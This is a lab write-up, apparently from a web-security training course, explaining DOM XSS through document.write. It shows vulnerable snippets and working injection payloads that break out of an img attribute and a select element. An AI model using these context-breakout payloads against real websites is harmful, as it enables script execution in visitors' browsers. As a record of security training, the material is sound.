# DOM XSS — document.write Sink

## The Sink

`document.write()` writes content into the document stream, where the browser parses it as HTML. Whether inserted content causes script execution depends on the markup, the parsing context, when the call occurs, and browser behavior. Not every HTML element is executable, and an inserted `<script>` does not necessarily execute in every situation.

The security risk is writing attacker-controlled data into this HTML-parsing context without appropriate handling. Inspect the exact surrounding markup and the timing of the call: the same value can be interpreted differently inside an attribute, an element, or a document that has already finished parsing.

```javascript
document.write("<tag>" + userInput + "</tag>");
//                        ↑
//              investigate whether this input is attacker-controlled
//              and how the browser parses it in this context
```

---

## Lab 1: DOM XSS in document.write using location.search

**Level:** Apprentice ✅ Solved

**Vulnerable code:**
```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms=' + 
    location.search + '">');
```

**What happens normally:**
```
URL: ?search=shoes
→ <img src="/resources/images/tracker.gif?searchTerms=shoes">
```

**The attack — break out of the attribute:**
```
Payload: "><svg onload=alert(1)>
```

**Result:**
```html
<img src="/resources/images/tracker.gif?searchTerms=">
<svg onload=alert(1)>">
```

The `"` closes the `src` attribute, `>` closes the `<img>` tag, then the `<svg>` tag with `onload` executes.

---

## Lab 2: DOM XSS in document.write inside a select element

**Level:** Practitioner ✅ Solved

**Vulnerable code:**
```javascript
var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
```

**The attack — inject outside the select context:**
```
?storeId="></select><img src=1 onerror=alert(1)>
```

**Result:**
```html
<select name="storeId">
<option selected>"></select>
<img src=1 onerror=alert(1)>
```

In this lab's parsing context, closing the `</select>` changes where the remaining markup is parsed, and the inserted image's error handler executes. This result is specific to the demonstrated markup and browser behavior; it should not be generalized to every `document.write()` call.

---

## Key Takeaways

- `document.write()` is risky with untrusted data because it writes into an HTML-parsing document stream
- Always check what **surrounds** your injection point — you may need to break out of an attribute or tag first
- The result depends on the context (inside `src=""`, inside `<select>`, etc.), timing, and browser parsing behavior
